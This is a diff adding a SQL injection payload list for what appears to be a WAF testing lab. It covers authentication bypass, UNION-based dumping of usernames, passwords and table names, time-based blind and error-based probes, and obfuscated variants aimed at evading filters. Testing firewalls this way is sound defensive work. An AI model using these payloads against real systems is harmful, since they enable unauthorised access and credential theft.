@@ -1,0 +1,30 @@
+# SQLi Payload List — waf-proxy-lab
+# Định dạng: một payload mỗi dòng | # = comment
+
+# === BASIC AUTH BYPASS ===
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+admin'--
+" OR "1"="1
+') OR ('1'='1
+
+# === UNION-BASED ===
+1' UNION SELECT user,password FROM users --
+1' UNION SELECT null,table_name FROM information_schema.tables --
+1' UNION ALL SELECT NULL,NULL --
+1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --
+
+# === TIME-BASED BLIND ===
+1' AND SLEEP(5) --
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --
+1'; WAITFOR DELAY '0:0:5' --
+
+# === ERROR-BASED ===
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) --
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+
+# === ENCODED / OBFUSCATED ===
+1' /*!OR*/ '1'='1
+1' %4fR '1'='1
+1'/**/OR/**/'1'='1
